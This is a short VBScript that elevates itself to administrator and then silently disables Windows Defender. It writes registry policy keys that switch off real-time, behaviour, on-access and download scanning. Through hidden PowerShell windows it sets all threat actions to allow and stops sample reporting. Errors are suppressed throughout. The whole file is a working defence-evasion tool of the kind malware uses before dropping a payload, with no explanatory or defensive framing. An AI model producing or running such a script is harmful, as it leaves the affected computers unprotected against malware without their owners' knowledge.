If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\DisableAntiSpyware",1,"REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableOnAccessProtection","1","REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableScanOnRealtimeEnable","1","REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableRawWriteNotification","1","REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableIOAVProtection","1","REG_DWORD"
WshShell.RegWrite "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection\DisableBehaviorMonitoring","1","REG_DWORD"

WScript.Sleep 100

outputMessage("Set-MpPreference -DisableRealtimeMonitoring $true")
outputMessage("Set-MpPreference -DisableBehaviorMonitoring $true")
outputMessage("Set-MpPreference -DisableBlockAtFirstSeen $true")
outputMessage("Set-MpPreference -DisableIOAVProtection $true")
outputMessage("Set-MpPreference -DisableScriptScanning $true")
outputMessage("Set-MpPreference -SubmitSamplesConsent 2")
outputMessage("Set-MpPreference -MAPSReporting 0")
outputMessage("Set-MpPreference -HighThreatDefaultAction 6 -Force")
outputMessage("Set-MpPreference -ModerateThreatDefaultAction 6")
outputMessage("Set-MpPreference -LowThreatDefaultAction 6")
outputMessage("Set-MpPreference -SevereThreatDefaultAction 6")


Sub outputMessage(byval args)
On Error Resume Next
Set objShell = CreateObject("Wscript.shell")
objShell.run("powershell " + args), 0
End Sub